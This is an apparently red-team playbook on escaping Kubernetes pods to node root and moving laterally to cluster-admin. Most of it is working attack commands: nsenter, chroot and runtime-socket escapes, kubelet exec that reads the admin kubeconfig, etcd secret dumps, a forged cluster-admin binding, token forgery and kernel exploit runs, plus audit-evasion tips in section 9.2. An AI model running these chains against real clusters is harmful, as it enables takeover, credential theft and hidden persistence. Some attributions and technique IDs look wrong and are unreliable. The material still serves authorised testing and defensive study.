# Kubernetes Container Escape and Lateral Movement Playbook

> Deep-dive companion to `skills/kubernetes-attack/SKILL.md` and `guides/kubernetes-attack-playbook.md`.
>
> Audience: red teamers and container security engineers who already understand `kubectl`, RBAC, and the cluster attack chain (covered in the parent playbook). This guide zooms in on the two most technically interesting phases of a K8s red team engagement: **escaping from a pod to its host node**, and **moving laterally** from that node (or from a privileged position in the cluster) to other workloads, other nodes, and other clusters. Real-world incidents ground every technique.

---

## 1. Why a Separate Escape & Lateral Movement Guide?

The companion `kubernetes-attack-playbook.md` is the operations manual — it walks you through the ten phases of a K8s engagement, from scope to cleanup. That playbook necessarily treats pod escape and lateral movement as items in a checklist. This guide slows down on those two phases.

The reasons:

1. **Escape is where the cluster becomes the cloud.** A pod running in a properly constrained namespace is contained. A pod that escapes to its host node becomes a node-root adversary, with access to every secret on that node, the kubelet's client cert, and (often) the cloud IAM role attached to that node.
2. **Lateral movement is where one pod becomes the cluster.** From any starting position — a single compromised pod, a single forged SA token, a single node-root — there are usually multiple paths to cluster-admin and beyond into the cloud account. Knowing which path to take is the difference between a 10-minute engagement and a 10-day engagement.
3. **Real-world incidents show the patterns.** Tesla cryptojacking (2018), Capital One (2019), TeamTNT cryptojacking campaigns (2020-2024) — these incidents all started with a K8s misconfiguration, escaped or moved laterally, and ended with material damage. Studying the incidents teaches you the techniques that actually work in production environments.

### 1.1 What this guide covers

| Section | Focus |
|---------|-------|
| 2 | Pod escape paths — privileged pods, hostPath, capabilities, hostPID/hostIPC, kernel CVEs, container runtime socket abuse |
| 3 | Kubelet API abuse (ports 10250/10255) — anonymous auth, run-as bypass, exec |
| 4 | etcd direct access — read/write secrets without going through the API |
| 5 | Service account token theft — projected tokens, long-lived tokens, audiences |
| 6 | RBAC privilege escalation paths — the canonical escalation verbs, with real chains |
| 7 | kubectl plugin ecosystem — peirates, kube-hunter, BOtB, kubeletctl |
| 8 | Real-world incidents — Tesla, Capital One, TeamTNT — and what each teaches |

---

## 2. Pod Escape Paths — From Container to Node Root

A pod escape is any technique that lets code running inside a container interact with the host's kernel, filesystem, or processes in a way the container runtime intended to prevent. Every escape ultimately exploits one of three things: excessive capabilities, excessive mounts, or a kernel/runtime bug.

### 2.1 The privileged pod (`securityContext.privileged: true`)

The simplest and most catastrophic escape. A privileged container is effectively a host process that happens to share a namespace with the container runtime.

```yaml
# Pod spec that should never have been deployed
apiVersion: v1
kind: Pod
metadata:
  name: debug-shell
  namespace: default
spec:
  containers:
  - name: shell
    image: ubuntu
    securityContext:
      privileged: true              # <-- this is the escape
    command: ["sleep", "infinity"]
```

**Escape**:

```bash
# From inside the privileged container
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
# You are now at a shell on the host, as root, in PID 1's namespaces.
```

Or equivalently:

```bash
# Or mount the host's root filesystem and chroot
mkdir /host
mount /dev/sda1 /host                # find the host root partition
chroot /host /bin/bash
```

**Detection**:

```bash
# Find every privileged pod in the cluster
kubectl get pods -A -o json | \
  jq -r '.items[] | select(.spec.containers[].securityContext.privileged==true) | "\(.metadata.namespace)/\(.metadata.name)"'
```

**Real-world note**: privileged pods are usually "debug" or "monitoring" pods that engineers deployed once and forgot. They are extremely common in production clusters.

### 2.2 The hostPath mount (`volumes.hostPath`)

A `hostPath` volume mounts a directory from the host node into the container. Mounting `/` is a full escape; mounting `/var/run/docker.sock` lets you spawn other containers; mounting `/etc` lets you read (and sometimes write) host configuration files.

```yaml
volumes:
- name: host-root
  hostPath:
    path: /                          # <-- full host filesystem
```

**Escape via chroot**:

```bash
# Inside the container, with the host root mounted at /host
chroot /host /bin/bash
# You are now in the host's filesystem, with the host's binaries.
```

**Escape via reading secrets directly** (no chroot needed):

```bash
# Read host's /etc/shadow
cat /host/etc/shadow

# Read kubelet client cert
cat /host/var/lib/kubelet/pki/kubelet-client-current.pem

# Read the kubelet's config (which tells you where everything else is)
cat /host/var/lib/kubelet/config.yaml

# Read other pods' secrets from the kubelet's directory
ls /host/var/lib/kubelet/pods/
```

**Dangerous hostPath targets**:

| Path | What it grants |
|------|----------------|
| `/` | Full filesystem access |
| `/proc` | Read `/proc/1/root/...` to access host filesystem via procfs |
| `/var/run/docker.sock` | Spawn arbitrary containers (Docker socket) |
| `/run/containerd/containerd.sock` | Spawn arbitrary containers (containerd socket) |
| `/var/lib/kubelet/pki/` | Kubelet client certs |
| `/etc/kubernetes/` | Control plane files (on a CP node) |
| `/etc/shadow` | Host password hashes |
| `/root/` | Root's home directory (SSH keys, history) |
| `/home/` | User home directories |

**Detection**:

```bash
# Find every pod with a hostPath volume
kubectl get pods -A -o json | \
  jq -r '.items[] | select(.spec.volumes[]?.hostPath) | "\(.metadata.namespace)/\(.metadata.name)"'

# Specifically, find pods with hostPath = /
kubectl get pods -A -o json | \
  jq -r '.items[] | select(.spec.volumes[]?.hostPath.path == "/") | "\(.metadata.namespace)/\(.metadata.name)"'
```

### 2.3 Capabilities (`securityContext.capabilities.add`)

Even without `privileged: true`, a pod may have specific Linux capabilities that enable escape. The dangerous ones:

| Capability | What it grants | Escape primitive |
|-----------|----------------|------------------|
| `CAP_SYS_ADMIN` | Bypass most kernel restrictions | `mount`, `nsenter`, `pivot_root` |
| `CAP_SYS_PTRACE` | Inspect/modify other processes | ptrace into host PID 1, read its memory |
| `CAP_SYS_MODULE` | Load kernel modules | `insmod` a kernel-rootkit |
| `CAP_NET_ADMIN` | Configure networking | sniff cluster network, alter routing |
| `CAP_NET_RAW` | Send raw packets | ARP spoofing on the pod network |
| `CAP_DAC_READ_SEARCH` | Bypass file read permissions | read any host file (if path reachable) |
| `CAP_DAC_OVERRIDE` | Bypass file write permissions | write to host files |

**CAP_SYS_ADMIN escape**:

```bash
# Mount the host's root filesystem
mkdir /host
mount /dev/sda1 /host                # or mount -t bind / /host
chroot /host /bin/bash
```

**CAP_SYS_PTRACE escape** (when hostPID is also true — common pairing):

```bash
# Find the host's init process (PID 1 in the host's PID namespace)
# With CAP_SYS_PTRACE, you can inject shellcode into it
# Tools: CVE-2019-5736 (runc), cdktaint, etc.
```

### 2.4 hostPID and hostIPC

```yaml
spec:
  hostPID: true                       # pod shares host's PID namespace
  hostIPC: true                       # pod shares host's IPC namespace
```

**hostPID escape** via nsenter:

```bash
# Inside a pod with hostPID=true
# List host processes
ps aux

# Use nsenter to enter PID 1's namespaces (mount, etc.) and get a host shell
nsenter --target 1 --mount -- bash
```

**hostPID + CAP_SYS_PTRACE escape**: read the memory of any host process to extract credentials, tokens, etc.

```bash
# Read kube-apiserver process memory to find service account tokens
cat /proc/$(pgrep kube-apiserver)/maps
# Then use gdb / process_vm_readv to extract tokens
```

### 2.5 Container runtime socket abuse

When the container runtime's socket (`docker.sock`, `containerd.sock`, `crio.sock`) is mounted into a pod, the pod can ask the runtime to spawn other containers — including privileged ones.

**Docker socket**:

```bash
# Inside a pod with /var/run/docker.sock mounted
curl -s --unix-socket /var/run/docker.sock http://localhost/version
# Or via docker CLI
docker run --privileged -v /:/host ubuntu chroot /host bash
```

**containerd socket**:

```bash
# With /run/containerd/containerd.sock mounted
ctr --address /run/containerd/containerd.sock image pull docker.io/library/ubuntu:latest
ctr --address /run/containerd/containerd.sock run --privileged --rm --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/ubuntu:latest pwn chroot /host bash
```

### 2.6 Kernel CVEs

When the pod has no excessive mounts or capabilities but runs on a kernel with a known escape CVE:

| CVE | Component | Primitive |
|-----|-----------|-----------|
| CVE-2022-0185 | `fs/context.c` (heap overflow) | Container escape with CAP_SYS_ADMIN (or `CAP_SYS_ADMIN`-equivalent user namespace) |
| CVE-2022-0492 | cgroup v1 `release_agent` | Escape with CAP_SYS_ADMIN via cgroup release_agent |
| CVE-2023-2640 / CVE-2023-32629 | OverlayFS | File permission bypass → overlay escape |
| CVE-2024-1086 | netfilter (USE-AFTER-FREE) | Container escape to host root |
| CVE-2024-21626 | runc ("Leaky Vessels") | FD leak → container escape via `exec` |
| CVE-2019-5736 | runc | Container escape via runc binary overwrite |

**CVE-2022-0185 PoC** (needs CAP_SYS_ADMIN or unprivileged user namespaces):

```bash
# GitHub reference PoC: github.com/Crusaders-of-Rust/CVE-2022-0185
# Compile and run inside the container to escape to the host.
git clone https://github.com/Crusaders-of-Rust/CVE-2022-0185
cd CVE-2022-0185
make
./exploit
```

### 2.7 The escape decision tree

```
Are you inside a privileged pod?
├── YES → nsenter --target 1 --mount -- bash. DONE.
└── NO  → Is / mounted via hostPath?
         ├── YES → chroot /host bash. DONE.
         └── NO  → Is docker.sock / containerd.sock mounted?
                  ├── YES → spawn a privileged container. DONE.
                  └── NO  → Is hostPID true?
                           ├── YES → nsenter --target 1 --mount -- bash. DONE.
                           └── NO  → Do you have CAP_SYS_ADMIN?
                                    ├── YES → mount, pivot_root, or CVE-2022-0185. DONE.
                                    └── NO  → Do you have CAP_SYS_PTRACE?
                                             ├── YES → ptrace host processes if any reachable.
                                             └── NO  → Is the kernel vulnerable to a known CVE
                                                      (CVE-2024-1086, etc.)?
                                                      ├── YES → run the PoC.
                                                      └── NO  → no easy escape; pivot via API.
```

---

## 3. Kubelet API Abuse — Ports 10250 and 10255

Every node runs a kubelet, which listens on TCP 10250 (HTTPS, authenticated) and TCP 10255 (HTTP, read-only, deprecated). Misconfigured kubelets are a common cluster-takeover vector.

### 3.1 The kubelet endpoints

| Endpoint | Port | Purpose | Auth required |
|----------|------|---------|---------------|
| `/pods` | 10250 | List all pods on the node | Yes (client cert) |
| `/run/...` | 10250 | Execute a command in a container | Yes |
| `/exec/...` | 10250 | Exec into a container (websocket) | Yes |
| `/attach/...` | 10250 | Attach to a container | Yes |
| `/portForward/...` | 10250 | Port forward | Yes |
| `/pods` | 10255 | List pods (read-only) | No (legacy) |
| `/stats/summary` | 10255 | Node and pod stats | No (legacy) |

### 3.2 Anonymous-auth misconfiguration

When the kubelet's `--anonymous-auth=true` (or the equivalent config flag) and authorization is set to `AlwaysAllow`, anyone who can reach port 10250 can execute commands in any container on that node.

**Detection**:

```bash
# From outside the node
curl -sk https://<node-ip>:10250/pods
# 200 with a pod list: anonymous auth is on, and authorization is permissive.

# Run a command
curl -sk -XPOST \
  "https://<node-ip>:10250/run/<namespace>/<pod>/<container>" \
  -d "cmd=id"
# Returns: uid=0(root) gid=0(root) groups=0(root)
```

**CVE-2018-1002105**: a CVE in kube-apiserver that allowed unauthenticated clients to escalate to admin via a malformed HTTP/2 connection. Fixed in 1.10.11 / 1.11.5 / 1.12.3, but old clusters still run vulnerable versions.

### 3.3 Kubelet run-as bypass

Even when the kubelet requires authentication, misconfigured RBAC lets a low-privilege SA execute commands:

```bash
# With a token that has nodes/proxy permission
TOKEN=...
curl -sk -H "Authorization: Bearer $TOKEN" \
  "https://<node-ip>:10250/run/kube-system/kube-apiserver/kube-apiserver" \
  -d "cmd=cat /etc/kubernetes/admin.conf"
```

This reads the cluster's admin kubeconfig from inside the kube-apiserver's container.

### 3.4 Stealing kubelet client cert from a compromised node

Once you have node root (via any of the escapes in §2), the kubelet's client cert is at:

```bash
cat /var/lib/kubelet/pki/kubelet-client-current.pem
# This cert authenticates as system:nodes:node-name
# With node RBAC, can read its own pods, secrets bound to its pods, etc.
```

Use the cert to authenticate to the kube-apiserver:

```bash
kubectl --client-certificate=kubelet-client-current.pem \
        --client-key=kubelet-client-current.key \
        get pods --all-namespaces
```

### 3.5 kubeletctl — a purpose-built tool

[kubeletctl](https://github.com/cyberark/kubeletctl) simplifies kubelet exploitation:

```bash
# Install
wget https://github.com/cyberark/kubeletctl/releases/latest/download/kubeletctl_linux_amd64
chmod +x kubeletctl && mv kubeletctl /usr/local/bin/

# List pods on each node
kubeletctl pods --server <node-ip> --port 10250

# Scan the cluster for vulnerable kubelets
kubeletctl scan --nodes <ip-range>

# Execute a command in a container
kubeletctl run "cat /var/run/secrets/kubernetes.io/serviceaccount/token" \
  --namespace default --pod my-pod --container my-container \
  --server <node-ip>
```

---

## 4. etcd Direct Access

`etcd` is the cluster's datastore — every secret, every configmap, every RBAC binding lives there. With network access to etcd and a client cert, you can read or write any object in the cluster without going through the API server.

### 4.1 Where etcd runs

- **Self-managed clusters** (kubeadm, RKE): etcd runs as a static pod on each control plane node.
- **Managed clusters** (EKS, GKE, AKS): etcd is hidden behind the managed control plane. Network access from the data plane is impossible.

### 4.2 Reading etcd (with certs)

```bash
# Locate the etcd certs
ls /etc/kubernetes/pki/etcd/
# ca.crt  server.crt  server.key  peer.crt  peer.key  healthcheck-client.crt

# Or from inside the etcd container
kubectl exec -n kube-system etcd-<cp-node> -- \
  ls /etc/kubernetes/pki/etcd/

# Use etcdctl to dump every secret in the cluster
ETCDCTL_API=3 etcdctl \
  --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/healthcheck-client.crt \
  --key=/etc/kubernetes/pki/etcd/healthcheck-client.key \
  get /registry/secrets --prefix --keys-only

# Or dump and decode a specific secret
ETCDCTL_API=3 etcdctl ... get /registry/secrets/default/my-secret | base64 -d
```

### 4.3 Writing etcd (persistence)

Writing to etcd bypasses the API server's audit log entirely. A backdoor added via etcd persists across `kubectl` operations and API restarts:

```bash
# Write a forged ClusterRoleBinding directly into etcd
ETCDCTL_API=3 etcdctl ... put /registry/clusterrolebindings/pwn-admin \
  "$(cat forged-crb.yaml | base64)"
# The forged CRB grants your SA cluster-admin.
# Next time an API server reads the binding cache, it picks up your CRB.
```

**Caveats**:

1. The etcd key format is protobuf for most objects, not JSON. Forging values requires generating correct protobuf.
2. Encrypted secrets (encryption-at-rest) require the encryption key from the API server to be readable.

### 4.4 Reading etcd via network capture

Even without etcd certs, if you can sniff cluster traffic on the network segment between kube-apiserver and etcd, you may capture etcd requests. This is rare in practice (etcd usually runs on a dedicated backend network) but worth noting.

---

## 5. Service Account Token Theft

SA tokens are bearer credentials. Steal one, and you have whatever RBAC the SA has. There are two flavors: **legacy long-lived** (pre-1.24) and **projected short-lived** (1.24+).

### 5.1 Legacy tokens (pre-1.24)

Every pod has a long-lived SA token mounted at `/var/run/secrets/kubernetes.io/serviceaccount/token`. The token does not expire until the SA's secret is deleted.

```bash
# From inside a pod
cat /var/run/secrets/kubernetes.io/serviceaccount/token
# eyJ...

# Decode the JWT
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | jq
# {
#   "aud": ["https://kubernetes.default.svc"],
#   "exp": 1735689600,          # far future
#   "iat": 1620000000,
#   "iss": "kubernetes/serviceaccount",
#   "kubernetes.io": {
#     "namespace": "default",
#     "serviceaccount": {"name": "default", "uid": "..."},
#     ...
#   },
#   "sub": "system:serviceaccount:default:default"
# }
```

### 5.2 Projected tokens (1.24+)

Post-1.24, SA tokens are projected tokens with short expiry (default 1 hour, refreshed). They are mounted at the same path, but the kubelet rotates them.

```bash
# Same path, but the token changes periodically
cat /var/run/secrets/kubernetes.io/serviceaccount/token
# Decoded JWT has:
# {
#   "exp": <1 hour from now>,
#   ...
# }
```

The exp claim means the token stops working after an hour. But within that hour, the token is fully usable from anywhere.

### 5.3 Token request API (`create serviceaccounts/token`)

In 1.24+, the `serviceaccounts/token` API lets you mint a token for any SA if you have the `create` verb on it:

```bash
# Forge a token for the kube-system default SA
kubectl create token -n kube-system default
# Returns: eyJ...

# Use the forged token
kubectl --token "<forged-token>" auth can-i --list
```

This is the modern equivalent of stealing the SA secret — and it works against 1.24+ clusters.

### 5.4 Token audiences

Tokens are scoped to an `audience` claim. A token with `aud=kubernetes.default.svc` works against the kube-apiserver. A token with `aud=sts.amazonaws.com` is intended for EKS IRSA — see §8.1 of the parent playbook.

Forging tokens with specific audiences is useful for cloud pivots:

```bash
# Forge a token with an AWS audience for IRSA abuse
kubectl create token -n <ns> <sa> --audience sts.amazonaws.com
```

### 5.5 Stealing tokens from secrets

When `create serviceaccounts/token` is not available, look for SA secrets (legacy) or for service-account-tokens stored in other secrets:

```bash
# Find all secrets of type service-account-token
kubectl get secrets -A -o json | \
  jq -r '.items[] | select(.type=="kubernetes.io/service-account-token") | "\(.metadata.namespace)/\(.metadata.name) -> \(.data.token | @base64d)"'
```

### 5.6 Token theft from cloud metadata

If the pod is in EKS/GKE/AKS, the cloud IAM role attached to the pod is accessible via the metadata service. The SA token's audience claim determines which cloud role it can assume — see §8 of the parent playbook for the cloud pivot.

---

## 6. RBAC Privilege Escalation Paths

RBAC escalation is the cluster's "domain admin" problem. Given a low-priv starting point, find the chain to cluster-admin.

### 6.1 The canonical escalation verbs

| Permission | Escalation to |
|-----------|---------------|
| `create` on `pods` (in a namespace with weak PSA) | Privileged pod → host root |
| `create` on `pods/exec` | Exec into any pod in that namespace, inherit its SA |
| `create` on `serviceaccounts/token` | Forge tokens for any SA |
| `create` on `certificatesigningrequests` (1.21- deprecated) | Sign a client cert for `system:masters` |
| `create` on `clusterrolebindings` | Bind your SA to any ClusterRole, incl. cluster-admin |
| `create` on `rolebindings` | Bind your SA to any Role in that namespace |
| `get` / `list` on `secrets` | Read SA tokens, TLS keys, cloud credentials |
| `get` / `list` on `pods` (with sensitive env) | Read cloud creds from pod env |
| `update` / `patch` on `deployments` / `statefulsets` | Modify pod specs to inject privileged containers |
| `impersonate` on users / groups | Impersonate a cluster-admin (rare, devastating) |

### 6.2 The five-chain escalation decision tree

```
What does my SA have?
├── create on pods (weak PSA namespace)
│   └── Create privileged pod → escape to host → read all secrets on node
├── create on serviceaccounts/token
│   └── Forge token for kube-system:default → use that token
├── create on clusterrolebindings
│   └── Bind your SA to cluster-admin → done
├── get/list on secrets (especially kube-system)
│   └── Read SA tokens + cloud credentials → lateral
└── create on certificatesigningrequests (1.21-)
    └── Sign a client cert for system:masters → done
```

### 6.3 Worked chain: from low-priv to cluster-admin

Suppose your starting SA is `webapp-sa` in namespace `webapp`, with these permissions:

- `create` on `pods` (in `webapp`)
- `get` on `secrets` (in `webapp`)

Step 1: list secrets in webapp, find the SA tokens.

```bash
kubectl get secrets -n webapp
kubectl get secret -n webapp default-token-xxxxx -o jsonpath='{.data.token}' | base64 -d
# But default in webapp is low-priv.
```

Step 2: create a privileged pod in `webapp` (assuming PSA is `privileged` or `baseline`).

```bash
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: escape
  namespace: webapp
spec:
  hostPID: true
  hostNetwork: true
  restartPolicy: Never
  containers:
  - name: shell
    image: alpine
    command: ["chroot", "/host", "sh"]
    securityContext: {privileged: true}
    volumeMounts: [{name: h, mountPath: /host}]
  volumes: [{name: h, hostPath: {path: /}}]
EOF
```

Step 3: from the node, read kubelet client certs, other pods' secrets, etcd secrets.

```bash
cat /var/lib/kubelet/pki/kubelet-client-current.pem
# Use the cert to authenticate as system:nodes:<node-name>
kubectl --client-certificate=kubelet-client-current.pem ... auth can-i --list
# system:nodes has limited perms but can read secrets for pods bound to it.
```

Step 4: forge tokens for higher-priv SAs.

```bash
# From the node (with kubelet creds), or via any SA with create on serviceaccounts/token
kubectl create token -n kube-system deployment-controller
# Use the forged token for the next step.
```

Step 5: bind your SA to cluster-admin.

```bash
# If your forged SA has create on clusterrolebindings
kubectl apply -f - <<EOF
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: pwn-admin
subjects:
- kind: ServiceAccount
  name: webapp-sa
  namespace: webapp
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
EOF
```

Step 6: verify cluster-admin.

```bash
kubectl auth can-i '*' '*'
# yes
```

### 6.4 The impersonate escalation

Rare but devastating. If your SA has `impersonate` verb on users/groups, you can act as any user:

```bash
kubectl --as cluster-admin get secrets -A
# Or impersonate a specific system:masters user
kubectl --as system:admin --as-group system:masters get secrets -A
```

---

## 7. kubectl Plugin Ecosystem — Purpose-Built Tools

The K8s attack tool ecosystem has matured. These tools are the red teamer's Swiss army knife.

### 7.1 peirates

[peirates](https://github.com/inguardians/peirates) is a Go program with an interactive shell for K8s attacks. It automates:

- SA token enumeration
- RBAC analysis
- Privileged pod creation
- Token forgery
- Cloud IAM pivots

```bash
# Install
go install github.com/inguardians/peirates@latest

# Run interactively
peirates
# At the prompt:
peirates:> list
peirates:> can-i
peirates:> attack
```

### 7.2 kube-hunter

[kube-hunter](https://github.com/aquasecurity/kube-hunter) is a scanner — it enumerates a cluster and reports vulnerabilities. Useful as a starting point in engagements.

```bash
kube-hunter --remote <cluster-ip>
kube-hunter --kubeconfig ~/.kube/config
# Lists: exposed APIs, anonymous auth, vulnerable kubelets, etc.
```

### 7.3 CDK (Container Deployment Kit)

[CDK](https://github.com/cdk-team/CDK) is a zero-dependency portable toolkit for container and K8s exploitation. Drop the single binary into any compromised container.

```bash
# In a compromised container
cdk evaluate --full             # automatic recon and vulnerability scan
cdk kcurl                       # anonymous kubelet check
cdk kinfo                       # pod environment info
cdk etcd --get '.*secret.*'     # etcd dump (if reachable)
cdk escape                      # automatic escape attempt
```

### 7.4 BOtB (Breach of Birth)

[BOtB](https://github.com/brompwnie/botb) is a container exploitation framework — finds docker.sock, container runtime sockets, etc.

```bash
./botb -find=sockets
./botb -find=namespaces
./botb -pwn=filesystem
```

### 7.5 kubeletctl

[kubeletctl](https://github.com/cyberark/kubeletctl) is dedicated to kubelet exploitation — see §3.5.

### 7.6 Other useful tools

| Tool | Purpose |
|------|---------|
| [kube-bench](https://github.com/aquasecurity/kube-bench) | CIS benchmark scanner |
| [kubeaudit](https://github.com/Shopify/kubeaudit) | Audit cluster for misconfigurations |
| [kubescape](https://github.com/kubescape/kubescape) | NSA / CIS framework scanner |
| [stratus-red-team](https://github.com/DataDog/stratus-red-team) | Emulate K8s attacks for detection |
| [kubernetes-goat](https://github.com/madhuakula/kubernetes-goat) | Vulnerable-by-design K8s cluster for training |
| [calico / cilium](https://github.com/cilium/cilium) | CNI tools for lateral movement analysis |
| [pluto](https://github.com/FairwindsOps/pluto) | Detect deprecated API versions (often security-relevant) |

---

## 8. Real-World Incidents and What They Teach

### 8.1 Tesla cryptojacking (2018)

In 2018, RedLock researchers discovered that Tesla's AWS environment had been compromised. The attackers:

1. Found a Kubernetes console exposed to the Internet without authentication.
2. Used the console to spawn pods in the cluster.
3. Those pods ran crypto-mining malware, with traffic tunneled through CloudFlare to evade detection.
4. Stole AWS IAM credentials from the pods.

**Lesson**: an unauthenticated Kubernetes API server (console) is a total compromise. The Tesla incident popularized the category of "K8s misconfigurations leading to crypto-mining."

Reference: [RedLock CSI report](https://www.redlock.io/csirt-11).

### 8.2 Capital One (2019)

While often discussed as a "classic cloud" breach, Capital One's 2019 breach involved an SSRF that allowed the attacker to query the EC2 instance metadata service, steal IAM credentials, and then enumerate S3 buckets containing customer data.

The K8s-relevant lesson: the SSRF vector was inside a containerized workload. The container had access to the IMDS, and the IMDS handed over the node's IAM role — which was overly permissive.

**Lesson**: even if your container is locked down, the underlying node's IAM role is the effective container's IAM role. Minimize node roles, use IRSA / Workload Identity, and (in AWS) enable IMDSv2 with hop-count limits.

Reference: [US Senate report](https://www.hsgac.senate.gov/imo/media/doc/Capital-One-Data-Breach-Investigative-Report.pdf).

### 8.3 TeamTNT (2020-2024)

TeamTNT is a cryptojacking crew that specifically targets K8s clusters and Docker hosts. Their playbook:

1. Scan the Internet for exposed Docker APIs and Kubernetes API servers.
2. Use exposed Docker APIs to spawn privileged containers.
3. Use exposed kubelets to exec into pods.
4. Deploy crypto-miners (XMRig) and credential stealers.
5. Steal AWS / GCP / Azure credentials from compromised pods.
6. Spread to other cloud services using those credentials.
7. Establish persistence via DaemonSets or CronJobs.

**Lesson**: internet-wide scanners find exposed cluster components within hours. Anonymous-auth on the kubelet or on the kube-apiserver's `--allow-privileged` is the entry vector.

Reference: [Aqua Security TeamTNT report](https://blog.aquasec.com/teamtnt-cryptojacking-watch-report-2024).

### 8.4 Microsoft Kubernetes Security Events (2023-2024)

Microsoft has documented multiple APT campaigns targeting K8s:

- **SCARLETTELUS** — deploys crypto-miners via Kubeflow.
- **CatB (UNC53)** — uses Kubeflow notebooks for cryptojacking.

**Lesson**: managed K8s services (EKS, GKE, AKS) themselves can be the entry vector if their control-plane components (Kubeflow, dashboards, etc.) are exposed.

Reference: [Microsoft Threat Intelligence](https://www.microsoft.com/en-us/security/blog/category/kubernetes/).

### 8.5 What the incidents teach in aggregate

1. **No anonymous auth, ever.** Whether on the kubelet or the kube-apiserver, anonymous auth is the single most common entry vector.
2. **Restrict the node IAM role.** The node's cloud role is the effective container role.
3. **Monitor for crypto-miners.** Cryptojacking is the most common monetization. Falco rule: `Container started with bitcoin miner process`.
4. **Patch the kernel.** Kernel CVEs (CVE-2022-0185, CVE-2024-1086) are actively exploited.
5. **Harden the supply chain.** Poisoned images are a common persistence vector.

---

## 9. Detection and Evasion Considerations

Every escape and lateral movement technique leaves traces. The red teamer's job is to understand those traces so that (a) you can clean up after the engagement, and (b) you can advise the defender on what to add to their detections.

### 9.1 What the defender sees

| Technique | Audit log | Falco / runtime | Network |
|-----------|-----------|-----------------|---------|
| Privileged pod creation | `create pods` audit event | "Privileged container started" | n/a |
| nsenter into PID 1 | n/a (host) | "Shell spawned in container" / "nsenter called" | n/a |
| mount /host | n/a (host) | "Mount in privileged container" | n/a |
| etcdctl get secrets | n/a (etcd has no audit) | (etcd-side log) | etcd traffic to port 2379/2380 |
| kubectl create token | `create serviceaccounts/token` audit event | n/a | API server traffic |
| kubectl create clusterrolebinding | `create clusterrolebindings` audit event | n/a | API server traffic |
| Kubelet exec | `proxy` audit event on the node | "Container exec via kubelet" | HTTPS to port 10250 |
| IRSA pivot | AWS CloudTrail `AssumeRoleWithWebIdentity` | n/a | HTTPS to `sts.amazonaws.com` |

### 9.2 Evasion strategies

- **Operate from outside the cluster**: exfiltrate tokens, replay from an external host. Audit log shows the external IP, not the pod.
- **Avoid `pods/exec`**: these events are audited at Request level (response body included). Use etcd reads instead.
- **Avoid creating RBAC bindings**: they are the loudest audit events. Forge tokens instead.
- **Use allowed network paths**: DNS exfil via `*.kube-dns.svc.cluster.local`, metadata via `169.254.169.254`.

### 9.3 The "honest red teamer" stance

For engagements, you typically **do not** try to evade the defender's detections. The engagement's value is in producing detections, not in defeating them. Cooperate with the SOC: tell them what you'll try, and let them hunt for your activity.

---

## 10. References

### 10.1 MITRE ATT&CK for Containers

- Matrix: [attack.mitre.org/matrices/enterprise/containers](https://attack.mitre.org/matrices/enterprise/containers)
- Key techniques:
  - T1611 Escape to Host (all of §2)
  - T1613 Container and Resource Discovery
  - T1614 System Location Discovery
  - T1615 Container Shell
  - T1525 Implant Internal Image
  - T1552 Unsecured Credentials (§5, §6)

### 10.2 Tools

- peirates: [github.com/inguardians/peirates](https://github.com/inguardians/peirates)
- kube-hunter: [github.com/aquasecurity/kube-hunter](https://github.com/aquasecurity/kube-hunter)
- CDK: [github.com/cdk-team/CDK](https://github.com/cdk-team/CDK)
- BOtB: [github.com/brompwnie/botb](https://github.com/brompwnie/botb)
- kubeletctl: [github.com/cyberark/kubeletctl](https://github.com/cyberark/kubeletctl)
- kubescape: [github.com/kubescape/kubescape](https://github.com/kubescape/kubescape)
- stratus-red-team: [github.com/DataDog/stratus-red-team](https://github.com/DataDog/stratus-red-team)
- kubernetes-goat: [github.com/madhuakula/kubernetes-goat](https://github.com/madhuakula/kubernetes-goat)

### 10.3 CVE references

- CVE-2018-1002105: [nvd.nist.gov/vuln/detail/CVE-2018-1002105](https://nvd.nist.gov/vuln/detail/CVE-2018-1002105)
- CVE-2022-0185: [nvd.nist.gov/vuln/detail/CVE-2022-0185](https://nvd.nist.gov/vuln/detail/CVE-2022-0185) / PoC at [github.com/Crusaders-of-Rust/CVE-2022-0185](https://github.com/Crusaders-of-Rust/CVE-2022-0185)
- CVE-2022-0492: [nvd.nist.gov/vuln/detail/CVE-2022-0492](https://nvd.nist.gov/vuln/detail/CVE-2022-0492)
- CVE-2024-1086: [nvd.nist.gov/vuln/detail/CVE-2024-1086](https://nvd.nist.gov/vuln/detail/CVE-2024-1086) / PoC at [github.com/Notselwyn/CVE-2024-1086](https://github.com/Notselwyn/CVE-2024-1086)
- CVE-2024-21626 (Leaky Vessels): [nvd.nist.gov/vuln/detail/CVE-2024-21626](https://nvd.nist.gov/vuln/detail/CVE-2024-21626) / [snyk.io/blog/cve-2024-21626-brainbreak](https://snyk.io/blog/cve-2024-21626-brainbreak-runc-vulnerability)

### 10.4 Industry reports

- NSA Kubernetes Hardening Guide (2022): [media.defense.gov (PDF)](https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220915.PDF)
- CIS Kubernetes Benchmark: [cisecurity.org/benchmark/kubernetes](https://www.cisecurity.org/benchmark/kubernetes)
- Aqua Security TeamTNT report: [blog.aquasec.com/teamtnt-cryptojacking-watch-report-2024](https://blog.aquasec.com/teamtnt-cryptojacking-watch-report-2024)
- Paloalto Unit 42 Kubernetes threat reports: [unit42.paloaltonetworks.com/category/kubernetes/](https://unit42.paloaltonetworks.com/category/kubernetes/)

### 10.5 Talks and training

- Ian Coldwater, "Hacking Kubernetes" (book): [learning.oreilly.com](https://learning.oreilly.com/library/view/hacking-kubernetes/9781492081722/)
- Ian Coldwater, Brad Geesaman, Duffie Cooley — "Advanced Persistence Threats: The Future of K8s Attacks" (KubeCon)
- DEF CON Workshops on K8s / Container Security
- Madhu Akula's Kubernetes Goat training

---

## Appendix A: Escape Cheat Sheet

```bash
# Are you in a privileged pod?
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Is / mounted via hostPath?
chroot /host /bin/bash

# Is docker.sock mounted?
docker -H unix:///var/run/docker.sock run --privileged -v /:/host ubuntu chroot /host bash

